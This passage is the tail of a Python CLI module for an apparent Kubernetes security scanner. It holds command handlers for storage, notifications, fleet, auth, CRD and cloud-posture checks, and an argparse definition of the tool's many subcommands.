        with open(out, "w", encoding="utf-8") as f:
            json.dump(spec, f, indent=2)
        print(f"[✓] OpenAPI 3.0.3 specification exported to: {out}")
    else:
        print(json.dumps(spec, indent=2))
    return 0


def cmd_benchmark(args):
    try:
        from benchmarks.run_benchmarks import run_benchmarks
    except ImportError:
        try:
            from .benchmarks.run_benchmarks import run_benchmarks
        except ImportError:
            sys.path.insert(0, str(Path(__file__).resolve().parent))
            from benchmarks.run_benchmarks import run_benchmarks
    iterations = get_arg(args, "iterations", 300)
    markdown = get_arg(args, "markdown", False)
    run_benchmarks(iterations=iterations, output_markdown=markdown)
    return 0


def cmd_storage(args):
    action = get_arg(args, "action", "stats")
    db_path = get_arg(args, "db_path")
    engine = EnterpriseStorageEngine(db_path=db_path)
    if action == "stats":
        stats = engine.get_stats()
        if get_arg(args, "json", False):
            print(json.dumps(stats, indent=2))
        else:
            print("[*] Enterprise Storage Engine Telemetry:")
            for k, v in stats.items():
                print(f"    • {k:<30}: {v}")
        return 0
    elif action == "prune":
        days = get_arg(args, "days", 90)
        count = engine.prune_retention(days_to_keep=days)
        print(f"[✓] Pruned {count} historical records older than {days} days.")
        return 0
    print(f"[!] Unrecognized storage action: '{action}'. Valid actions: stats, prune", file=sys.stderr)
    return 1


def cmd_notify(args):
    channel = (get_arg(args, "channel", "slack")).lower()
    url = get_arg(args, "url", "")
    alert = AlertPayload(
        title=get_arg(args, "title", "Enterprise Security Alert"),
        severity=get_arg(args, "severity", "HIGH"),
        description=get_arg(args, "description", "Automated alert dispatched from scanner CLI."),
        cluster_id=get_arg(args, "cluster", "production-fleet"),
        namespace=get_arg(args, "namespace", "default"),
        workload_name=get_arg(args, "workload", "demo-app"),
        remediation=get_arg(args, "remediation", "Drop Linux capabilities and set readOnlyRootFilesystem=true"),
    )
    if channel == "slack":
        ok = NotificationDispatcher.send_slack_alert(url, alert)
    elif channel == "teams":
        ok = NotificationDispatcher.send_teams_alert(url, alert)
    elif channel == "pagerduty":
        ok = NotificationDispatcher.send_pagerduty_event(url, alert)
    else:
        print(f"[!] Unsupported notification channel: {channel}")
        return 1
    print(f"[{'✓' if ok else '!'}] Alert dispatch status: {'SUCCESS' if ok else 'FAILED'}")
    return 0 if ok else 1


def cmd_fleet(args):
    tenant = get_arg(args, "tenant", "default-tenant")
    manager = FleetManager(tenant_id=tenant)
    action = get_arg(args, "action", "overview")

    if action == "register":
        cid = get_arg(args, "cluster_id") or f"cls-{int(time.time())}"
        name = get_arg(args, "name", "production-cluster")
        c = manager.register_cluster(
            cluster_id=cid,
            name=name,
            tenant_id=tenant,
            cloud_provider=get_arg(args, "provider", "aws"),
            region=get_arg(args, "region", "us-east-1"),
        )
        print(f"[✓] Cluster registered successfully:")
        print(f"    ID       : {c.cluster_id}")
        print(f"    Name     : {c.name}")
        print(f"    Provider : {c.cloud_provider.upper()} ({c.region})")
        print(f"    Tenant   : {c.tenant_id}")
        return 0

    if action == "distribute":
        res = manager.distribute_fleet_policy(tenant, "pol-default-zerotrust")
        print(f"[✓] Fleet Zero-Trust Baseline policy distributed to {res['targets_count']} cluster(s).")
        return 0

    if action == "overview":
        manager.register_cluster("eks-us-east-prod", "EKS US-East Prod", cloud_provider="aws", region="us-east-1")
        manager.register_cluster("gke-eu-west-prod", "GKE EU-West Prod", cloud_provider="gcp", region="europe-west1")

        summary = manager.get_fleet_summary(get_arg(args, "tenant"))
        print(f"\n[+] Global Fleet Security Overview:")
        print(f"    Total Clusters       : {summary.total_clusters}")
        print(f"    Active Reporting     : {summary.active_clusters}")
        print(f"    Global Threat Index  : {summary.global_threat_index:.1f}/100.0 (Status: {'HEALTHY' if summary.global_threat_index < 30 else 'ALERT'})")
        print(f"    Average Fleet Score  : {summary.average_security_score:.1f}%")
        print(f"    Critical Deficits    : {summary.critical_findings_total}")

        clusters = manager.list_clusters(get_arg(args, "tenant"))
        print("-" * 80)
        print(f"{'CLUSTER ID':<22} {'PROVIDER':<10} {'REGION':<15} {'SCORE':<8} {'THREAT':<8} {'STATUS'}")
        print("-" * 80)
        for c in clusters:
            print(f"{c.cluster_id:<22} {c.cloud_provider.upper():<10} {c.region:<15} {c.security_score:<8.1f} {c.threat_index:<8.1f} {c.status}")
        return 0

    print(f"[!] Unrecognized fleet action: '{action}'. Valid actions: overview, register, distribute", file=sys.stderr)
    return 1


def cmd_auth(args):
    tenant = get_arg(args, "tenant", "default-tenant")
    auth_mgr = EnterpriseAuthManager(default_tenant=tenant)
    action = get_arg(args, "action", "token")

    if action == "token":
        roles = [get_arg(args, "role", ROLE_SECURITY_ENGINEER)]
        subject = get_arg(args, "subject", "admin")
        token = auth_mgr.issue_jwt(
            tenant_id=tenant,
            subject=subject,
            roles=roles,
        )
        print(f"[✓] Bearer JWT Token Issued for subject '{subject}':")
        print(token)
        return 0

    if action == "api-key":
        roles = [get_arg(args, "role", ROLE_PLATFORM_ADMIN)]
        subject = get_arg(args, "subject", "service-account")
        key, rec = auth_mgr.generate_api_key(
            tenant_id=tenant,
            subject=subject,
            roles=roles,
        )
        print(f"[✓] Enterprise Cryptographic API Key Generated:")
        print(f"    Key ID : {rec.key_id}")
        print(f"    Secret : {key}")
        print(f"    Roles  : {', '.join(rec.roles)}")
        print(f"    Expires: {rec.expires_at}")
        return 0

    print(f"[!] Unrecognized auth action: '{action}'. Valid actions: token, api-key", file=sys.stderr)
    return 1


def cmd_crd(args):
    crds = KubernetesCRDManager.get_all_crd_manifests()
    if getattr(args, "output", None):
        Path(args.output).write_text(crds, encoding="utf-8")
        print(f"[✓] Kubernetes CRDs exported to: {args.output}")
    else:
        print(crds)
    return 0


def cmd_cspm(args):
    engine = CloudCSPMEngine()
    path = Path(args.target)
    if not path.is_file():
        print(f"Error: Inventory file '{path}' not found.", file=sys.stderr)
        return 1
    inventory = json.loads(path.read_text(encoding="utf-8"))
    report = engine.evaluate_cloud_inventory(inventory)
    if getattr(args, "json", False):
        print(json.dumps(report.to_dict(), indent=2))
    else:
        print(f"\n[+] Multi-Cloud Infrastructure CSPM Assessment:")
        print(f"    Resources Audited : {report.total_resources_audited}")
        print(f"    CSPM Score        : {report.cspm_score:.1f}/100.0 ({report.risk_tier} Risk)")
        print(f"    Total Findings    : {len(report.findings)}")
        print("-" * 80)
        for f in report.findings[:15]:
            print(f"  [{f.severity:<8}] {f.cloud_provider.upper()} {f.resource_type}: {f.title}")
            print(f"             Remediation: {f.remediation}")
    return 0 if report.cspm_score >= (getattr(args, "min_score", 70.0) or 70.0) else 1


def main():
    parser = argparse.ArgumentParser(
        prog="k8s-native-scan",
        description="Kubernetes Native Security Scanner, Attack Path DAG & Enterprise CNAPP Engine",
    )
    parser.add_argument("-v", "--version", action="version", version=f"k8s-native-scanner v{__version__}")
    subparsers = parser.add_subparsers(dest="command", help="Available Commands")

    # scan
    p_scan = subparsers.add_parser("scan", help="Audit Kubernetes manifests (56-Taxonomy & Attack Path DAG)")
    p_scan.add_argument("target", help="Manifest YAML file or directory of manifests")
    p_scan.add_argument("--json", action="store_true", help="Output results in JSON format")
    p_scan.add_argument("--json-output", help="Save JSON report to file")
    p_scan.add_argument("--sarif", help="Export results to SARIF v2.1.0 (for GitHub/GitLab Code Scanning)")
    p_scan.add_argument("--junit", help="Export test results to standard JUnit XML format")
    p_scan.add_argument("--github-actions", action="store_true", help="Emit GitHub Actions PR inline annotations")
    p_scan.add_argument("--html", help="Export standalone interactive HTML audit report")
    p_scan.add_argument("--mermaid", help="Output attack path DAG as a Mermaid graph (.mmd)")
    p_scan.add_argument("--attack-graph", action="store_true", help="Compute full cluster lateral attack paths")
    p_scan.add_argument("--compliance", action="store_true", help="Evaluate regulatory compliance")
    p_scan.add_argument("--cert-output", help="Save Markdown compliance certificate")
    p_scan.add_argument("--min-score", type=float, help="Fail CI/CD if compliance score is below threshold (0-100)")
    p_scan.add_argument("--ci-check", action="store_true", help="Fail CI/CD if compliance score is below minimum threshold")
    p_scan.add_argument("--rules-dir", help="Path to declarative rules directory")
    p_scan.add_argument("--rule-file", help="Path to a single custom declarative rule file")
    p_scan.add_argument("--no-recursive", action="store_true", help="Do not recursively traverse subdirectories")

    # remediate
    p_rem = subparsers.add_parser("remediate", help="Automated least-privilege securityContext auto-remediation")
    p_rem.add_argument("target", help="Target manifest YAML to remediate")
    p_rem.add_argument("-w", "--write", action="store_true", help="Write changes directly back to manifest in-place")
    p_rem.add_argument("-o", "--output", help="Save hardened manifest to a separate file")
    p_rem.add_argument("--diff", action="store_true", help="Display unified diff of modifications")

    # scan-image
    p_img = subparsers.add_parser("scan-image", help="Pure-Python container layer inspection & SBOM generation")
    p_img.add_argument("image", nargs="?", default="", help="Container image reference (e.g. nginx:1.14)")
    p_img.add_argument("--tarball", help="Inspect a local container tarball archive instead of pulling")
    p_img.add_argument("--cyclonedx", help="Save SBOM in CycloneDX v1.5 JSON format")
    p_img.add_argument("--spdx", help="Save SBOM in SPDX v2.3 JSON format")
    p_img.add_argument("-o", "--output", help="Save SBOM report to JSON file")

    # attack-graph
    p_dag = subparsers.add_parser("attack-graph", help="Compute lateral exploit kill-chains & Blast Radius index")
    p_dag.add_argument("target", help="Manifest YAML file or directory")
    p_dag.add_argument("--mermaid", help="Save attack graph in Mermaid (.mmd) format")

    # compliance
    p_comp = subparsers.add_parser("compliance", help="Evaluate multi-framework regulatory compliance")
    p_comp.add_argument("target", help="YAML manifest or directory")
    p_comp.add_argument("-o", "--output", help="Save Markdown compliance certificate to file")
    p_comp.add_argument("--framework", default="all", help="Target regulatory framework (e.g. all, pci-dss, soc2, hipaa, iso27001, nist, waf)")

    # bundle
    p_bnd = subparsers.add_parser("bundle", help="Export, verify, and import offline air-gapped sovereign bundles")
    bnd_sub = p_bnd.add_subparsers(dest="bundle_action", help="Bundle action")

    p_bnd_exp = bnd_sub.add_parser("export", help="Export offline rules and CVE threat database to .tar.gz bundle")
    p_bnd_exp.add_argument("output", help="Path to write .tar.gz bundle archive")
    p_bnd_exp.add_argument("-r", "--rules-dir", help="Directory of declarative rules to package")
    p_bnd_exp.add_argument("--cve-db", help="Path to SQLite CVE database to package")

    p_bnd_ver = bnd_sub.add_parser("verify", help="Cryptographically verify an air-gapped bundle without extracting")
    p_bnd_ver.add_argument("target", help="Path to .tar.gz bundle archive")

    p_bnd_imp = bnd_sub.add_parser("import", help="Safely import verified air-gapped bundle into local environment")
    p_bnd_imp.add_argument("target", help="Path to .tar.gz bundle archive")
    p_bnd_imp.add_argument("-d", "--destination", help="Target extraction directory")

    # webhook
    p_wh = subparsers.add_parser("webhook", help="Run in-cluster Kubernetes Validating & Mutating Admission Webhook")
    p_wh.add_argument("--port", type=int, default=8443, help="HTTPS port to listen on (default: 8443)")
    p_wh.add_argument("--host", default="0.0.0.0", help="Host address to bind to (default: 0.0.0.0)")
    p_wh.add_argument("--cert", help="Path to TLS certificate PEM (auto-generated if omitted)")
    p_wh.add_argument("--key", help="Path to TLS private key PEM (auto-generated if omitted)")
    p_wh.add_argument("--mode", default="enforce", choices=["enforce", "warn", "shadow", "dry-run"], help="Admission enforcement mode")
    p_wh.add_argument("--min-score", type=float, default=70.0, help="Minimum compliance score required for admission")
    p_wh.add_argument("--generate-config", action="store_true", help="Generate turnkey Validating & Mutating webhook YAML manifests")
    p_wh.add_argument("--service-name", default="k8s-native-scan-webhook", help="Webhook service name")
    p_wh.add_argument("--namespace", default="kube-system", help="Webhook namespace")
    p_wh.add_argument("-o", "--output", help="Save generated YAML manifest to file")

    # node-audit
    p_node = subparsers.add_parser("node-audit", help="Audit host Linux node & control plane against CIS Benchmark v2.0")
    p_node.add_argument("--root", default="", help="Filesystem root prefix (e.g. /host when run in container)")
    p_node.add_argument("--json", action="store_true", help="Output results in JSON format")
    p_node.add_argument("-o", "--output", help="Save JSON report to file")

    # scan-iac
    p_iac = subparsers.add_parser("scan-iac", help="Audit Dockerfile or Terraform Kubernetes infrastructure")
    p_iac.add_argument("target", help="Path to Dockerfile or .tf file")
    p_iac.add_argument("--min-score", type=float, default=70.0, help="Minimum compliance score threshold")
    p_iac.add_argument("-o", "--output", help="Save report to file")

    # cve
    p_cve = subparsers.add_parser("cve", help="Query and synchronize embedded SQLite CVE intelligence database")
    p_cve.add_argument("--sync", action="store_true", help="Synchronize live CVE deltas from OSV.dev")
    p_cve.add_argument("--lookup", help="Query historical CVEs for a specific package name")
    p_cve.add_argument("--stats", action="store_true", help="Display embedded SQLite database vulnerability statistics")
    p_cve.add_argument("--db", help="Path to custom SQLite CVE database")

    # dashboard
    p_dash = subparsers.add_parser("dashboard", help="Start local self-hosted Web Management Console")
    p_dash.add_argument("--port", type=int, default=8080, help="HTTP port (default: 8080)")
    p_dash.add_argument("--host", default="127.0.0.1", help="Host address (default: 127.0.0.1)")

    # ebpf
    p_ebpf = subparsers.add_parser("ebpf", help="Inspect in-tree eBPF kernel tracepoint status & behavioral anomaly detection")
    p_ebpf.add_argument("--simulate", action="store_true", help="Simulate a real-time kernel security event (e.g. execve interactive shell)")
    p_ebpf.add_argument("--cef", action="store_true", help="Format event in ArcSight Common Event Format (CEF:0) for Splunk/Sentinel")
    p_ebpf.add_argument("--syslog", action="store_true", help="Format event in RFC 5424 Syslog format")
    p_ebpf.add_argument("--format", choices=["CEF", "RFC5424", "JSON"], default="CEF", help="Output format for SIEM forwarder")

    # cluster
    p_cls = subparsers.add_parser("cluster", help="Live In-Cluster Security Posture & Vulnerability Scanner (CSPM Engine)")
    p_cls.add_argument("-n", "--namespace", help="Scan specific namespace (default: all namespaces)")
    p_cls.add_argument("--kubeconfig", help="Path to custom kubeconfig file")
    p_cls.add_argument("--min-score", type=float, default=70.0, help="Minimum compliance score threshold")
    p_cls.add_argument("--remediate-out", help="Directory to export auto-remediated manifests for failing workloads")
    p_cls.add_argument("-o", "--output", help="Save cluster audit report to JSON file")

    # gitops
    p_gops = subparsers.add_parser("gitops", help="Shift-Left GitOps auto-remediation PR bot & Kustomize patch overlay generator")
    p_gops.add_argument("target", help="Path to Git repository or manifest directory")
    p_gops.add_argument("--threshold", type=float, default=70.0, help="Policy score threshold below which workloads are remediated")
    p_gops.add_argument("--kustomize-out", help="Export Kustomize strategic merge patch overlay directory")
    p_gops.add_argument("--pr-body-out", help="Save formatted GitHub PR / GitLab MR Markdown body to file")
    p_gops.add_argument("--in-place", action="store_true", help="Apply hardened changes directly to target files in-place")
    p_gops.add_argument("--ci-check", action="store_true", help="Fail with exit code 1 if any workloads fail the policy threshold")

    # export-metrics
    p_exp = subparsers.add_parser("export-metrics", help="Export Prometheus & OpenMetrics security posture metrics")
    p_exp.add_argument("target", help="Path to manifest file or directory to evaluate")
    p_exp.add_argument("-o", "--output", help="Save OpenMetrics .prom textfile")
    p_exp.add_argument("--serve", action="store_true", help="Start live HTTP daemon serving /metrics")
    p_exp.add_argument("--port", type=int, default=9108, help="HTTP port to listen on (default: 9108)")
    p_exp.add_argument("--host", default="0.0.0.0", help="Host address to bind to (default: 0.0.0.0)")

    # agent
    p_agt = subparsers.add_parser("agent", help="Autonomous Kubernetes Security AI Agent (ReAct reasoning & In-Cluster Watch)")
    p_agt.add_argument("target", nargs="?", default=".", help="Target manifest path or directory (default: current dir)")
    p_agt.add_argument("-p", "--prompt", help="Natural language security question or task description")
    p_agt.add_argument("-i", "--interactive", action="store_true", help="Start interactive multi-turn REPL copilot session")
    p_agt.add_argument("--provider", choices=["auto", "gemini", "openai", "anthropic", "ollama", "local"], default="auto", help="LLM Provider")
    p_agt.add_argument("--model", help="LLM model name (e.g. gemini-1.5-flash, gpt-4o, llama3.2)")
    p_agt.add_argument("--api-key", help="API key for LLM provider (or pass via env vars)")
    p_agt.add_argument("--base-url", help="Base URL for OpenAI-compatible or Ollama endpoints")
    p_agt.add_argument("--max-steps", type=int, default=5, help="Maximum ReAct reasoning and tool-calling steps")
    p_agt.add_argument("--watch", action="store_true", help="Run continuous in-cluster watch daemon")
    p_agt.add_argument("-n", "--namespace", help="Namespace for in-cluster watch daemon")
    p_agt.add_argument("--interval", type=int, default=60, help="Interval seconds between cluster audit cycles")
    p_agt.add_argument("--alert-webhook", help="Webhook URL to POST high-priority drift alerts (Slack/PagerDuty)")

    # chat
    p_chat = subparsers.add_parser("chat", help="Start Interactive Multi-Turn AI Copilot REPL session")
    p_chat.add_argument("target", nargs="?", default=".", help="Target manifest path or directory (default: current dir)")
    p_chat.add_argument("--provider", choices=["auto", "gemini", "openai", "anthropic", "ollama", "local"], default="auto", help="LLM Provider")
    p_chat.add_argument("--model", help="LLM model name")

    # mcp
    p_mcp = subparsers.add_parser("mcp", help="Run standard Model Context Protocol (MCP) JSON-RPC 2.0 server over stdio")

    # vex
    p_vex = subparsers.add_parser("vex", help="Generate CISA OpenVEX v0.2.0 contextual exploitability report (correlate CVEs with runtime defenses)")
    p_vex.add_argument("target", help="Kubernetes manifest YAML to evaluate")
    p_vex.add_argument("--image", help="Override container image name for CVE lookup")
    p_vex.add_argument("-o", "--output", help="Save OpenVEX v0.2.0 JSON report to file")
    p_vex.add_argument("--json", action="store_true", help="Output raw OpenVEX JSON instead of terminal summary")

    # simulate
    p_sim = subparsers.add_parser("simulate", help="Adversarial Threat Modeling & Multi-Stage Kill Chain Simulation")
    p_sim.add_argument("target", help="Kubernetes manifest YAML or directory to simulate attacks against")
    p_sim.add_argument("--json", action="store_true", help="Output raw simulation JSON report")

    # verify-image
    p_vimg = subparsers.add_parser("verify-image", help="Verify Cosign/Sigstore cryptographic signature and SLSA provenance")
    p_vimg.add_argument("image", help="Container image reference (e.g. repo/image@sha256:...)")
    p_vimg.add_argument("--json", action="store_true", help="Output raw verification JSON")

    # kubecam
    p_kcam = subparsers.add_parser("kubecam", help="KubeCam: Cluster Continuous Assessment Monitor, Security Camera & Kubescape Bridge")
    p_kcam.add_argument("action", nargs="?", default="snapshot", choices=["snapshot", "record", "kubescape"], help="Action: snapshot (default), record (time-lapse), or kubescape (export)")
    p_kcam.add_argument("-n", "--namespace", help="Filter by specific Kubernetes namespace")
    p_kcam.add_argument("--interval", type=int, default=5, help="Interval in seconds between time-lapse frames (for 'record')")
    p_kcam.add_argument("--frames", type=int, default=3, help="Number of frames to record (for 'record')")
    p_kcam.add_argument("-o", "--output", help="Save snapshot or filmstrip to JSON file")
    p_kcam.add_argument("--json", action="store_true", help="Output raw JSON results")

    # lifecycle
    p_life = subparsers.add_parser("lifecycle", help="End-to-End Container Security Lifecycle Audit (Build -> Ship -> Deploy -> Run -> Post-Run)")
    p_life.add_argument("target", help="Kubernetes manifest YAML to audit across all 5 lifecycle phases")
    p_life.add_argument("--dockerfile", help="Path to associated Dockerfile (for Phase 1: Build IaC audit)")
    p_life.add_argument("--image", help="Container image reference (override for Phase 2: Supply Chain audit)")
    p_life.add_argument("--min-score", type=float, default=75.0, help="Minimum lifecycle compound score threshold (default: 75.0)")
    p_life.add_argument("--ci-check", action="store_true", help="Exit with code 1 if workload fails lifecycle security gate")
    p_life.add_argument("-o", "--output", help="Save lifecycle report to JSON file")
    p_life.add_argument("--json", action="store_true", help="Output raw JSON lifecycle report")

    # server
    p_srv = subparsers.add_parser("server", help="Start Enterprise Multi-Tenant CNAPP REST Server & Multi-Cluster Web Portal")
    p_srv.add_argument("--port", type=int, default=8443, help="Port to listen on (default: 8443)")
    p_srv.add_argument("--host", default="0.0.0.0", help="Host interface to bind to (default: 0.0.0.0)")

    # fleet
    p_flt = subparsers.add_parser("fleet", help="Hyperscale Multi-Cluster Fleet Manager & Central Aggregation Service")
    p_flt.add_argument("action", nargs="?", default="overview", choices=["overview", "register", "distribute"], help="Action: overview (default), register, or distribute")
    p_flt.add_argument("--tenant", default="default-tenant", help="Tenant ID filter (default: default-tenant)")
    p_flt.add_argument("--cluster-id", help="Cluster ID for registration")
    p_flt.add_argument("--name", help="Human-readable cluster name")
    p_flt.add_argument("--provider", choices=["aws", "gcp", "azure", "onprem"], default="aws", help="Cloud provider")
    p_flt.add_argument("--region", default="us-east-1", help="Cloud provider region")

    # auth
    p_ath = subparsers.add_parser("auth", help="Enterprise Identity, RBAC & API Key Management")
    p_ath.add_argument("action", nargs="?", default="token", choices=["token", "api-key"], help="Action: token (default) or api-key")
    p_ath.add_argument("--tenant", default="default-tenant", help="Tenant ID")
    p_ath.add_argument("--subject", default="admin", help="User or service identity subject")
    p_ath.add_argument("--role", choices=[ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR], default=ROLE_SECURITY_ENGINEER, help="Assigned enterprise RBAC role")

    # crd
    p_crd = subparsers.add_parser("crd", help="Export turnkey Kubernetes CustomResourceDefinition (CRD) manifests")
    p_crd.add_argument("-o", "--output", help="Save CRD manifests to a YAML file")

    # cspm
    p_cspm = subparsers.add_parser("cspm", help="Multi-Cloud Infrastructure Security Posture Management (AWS, GCP, Azure)")
    p_cspm.add_argument("target", help="Path to cloud resource inventory JSON or HCL manifest")
    p_cspm.add_argument("--json", action="store_true", help="Output raw JSON results")
    p_cspm.add_argument("--min-score", type=float, default=70.0, help="Minimum CSPM posture score threshold (default: 70.0)")

    # docs
    p_docs = subparsers.add_parser("docs", help="Export OpenAPI 3.0.3 specification schema")
    p_docs.add_argument("-o", "--output", help="Save OpenAPI schema to JSON file")

    # storage
    p_stor = subparsers.add_parser("storage", help="Enterprise Telemetry Persistence & Maintenance (SQLite WAL)")
    p_stor.add_argument("action", nargs="?", default="stats", choices=["stats", "prune"], help="Action: stats (default) or prune")
    p_stor.add_argument("--db-path", help="Override SQLite database file path")
    p_stor.add_argument("--days", type=int, default=90, help="Days to keep when pruning records (default: 90)")
    p_stor.add_argument("--json", action="store_true", help="Output raw JSON results")

    # notify
    p_notif = subparsers.add_parser("notify", help="Dispatch security alert card to Slack, MS Teams, or PagerDuty")
    p_notif.add_argument("--channel", choices=["slack", "teams", "pagerduty"], default="slack", help="Target notification channel")
    p_notif.add_argument("--url", required=True, help="Webhook URL or PagerDuty routing key")
    p_notif.add_argument("--title", default="Security Deficit Detected", help="Alert title")
    p_notif.add_argument("--severity", choices=["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"], default="HIGH", help="Alert severity")
    p_notif.add_argument("--description", default="Runtime policy violation detected in production workload.", help="Detailed incident description")
    p_notif.add_argument("--cluster", default="production-fleet", help="Affected cluster ID")
    p_notif.add_argument("--namespace", default="prod", help="Kubernetes namespace")
    p_notif.add_argument("--workload", default="backend-api", help="Kubernetes workload name")

    # benchmark
    p_bnch = subparsers.add_parser("benchmark", help="Run reproducible performance and latency micro-benchmarks")
    p_bnch.add_argument("-n", "--iterations", type=int, default=300, help="Number of test iterations (default: 300)")
    p_bnch.add_argument("--markdown", action="store_true", help="Print results formatted as a Markdown table")

    args = parser.parse_args()

    if not args.command:
        print_banner()
        parser.print_help()
        sys.exit(0)

    if args.command == "scan":
        sys.exit(cmd_scan(args))
    elif args.command == "remediate":
        sys.exit(cmd_remediate(args))
    elif args.command == "scan-image":
        sys.exit(cmd_scan_image(args))
    elif args.command == "attack-graph":
        sys.exit(cmd_attack_graph(args))
    elif args.command == "compliance":
        sys.exit(cmd_compliance(args))
    elif args.command == "bundle":
        if not args.bundle_action:
            p_bnd.print_help()
            sys.exit(0)
        sys.exit(cmd_bundle(args))
    elif args.command == "webhook":
        sys.exit(cmd_webhook(args))
    elif args.command == "node-audit":
        sys.exit(cmd_node_audit(args))
    elif args.command == "scan-iac":
        sys.exit(cmd_scan_iac(args))
    elif args.command == "cve":
        sys.exit(cmd_cve(args))
    elif args.command == "dashboard":
        sys.exit(cmd_dashboard(args))
    elif args.command == "ebpf":
        sys.exit(cmd_ebpf(args))
    elif args.command == "cluster":
        sys.exit(cmd_cluster(args))
    elif args.command == "gitops":
        sys.exit(cmd_gitops(args))
    elif args.command == "export-metrics":
        sys.exit(cmd_export_metrics(args))
    elif args.command == "agent":
        sys.exit(cmd_agent(args))
    elif args.command == "mcp":
        sys.exit(cmd_mcp(args))
    elif args.command == "vex":
        sys.exit(cmd_vex(args))
    elif args.command == "chat":
        sys.exit(cmd_chat(args))
    elif args.command == "simulate":
        sys.exit(cmd_simulate(args))
    elif args.command == "verify-image":
        sys.exit(cmd_verify_image(args))
    elif args.command == "kubecam":
        sys.exit(cmd_kubecam(args))
    elif args.command == "lifecycle":
        sys.exit(cmd_lifecycle(args))
    elif args.command == "server":
        sys.exit(cmd_server(args))
    elif args.command == "fleet":
        sys.exit(cmd_fleet(args))
    elif args.command == "auth":
        sys.exit(cmd_auth(args))
    elif args.command == "crd":
        sys.exit(cmd_crd(args))
    elif args.command == "cspm":
        sys.exit(cmd_cspm(args))
    elif args.command == "docs":
        sys.exit(cmd_docs(args))
    elif args.command == "storage":
        sys.exit(cmd_storage(args))
    elif args.command == "notify":
        sys.exit(cmd_notify(args))
    elif args.command == "benchmark":
        sys.exit(cmd_benchmark(args))


if __name__ == "__main__":
    main()
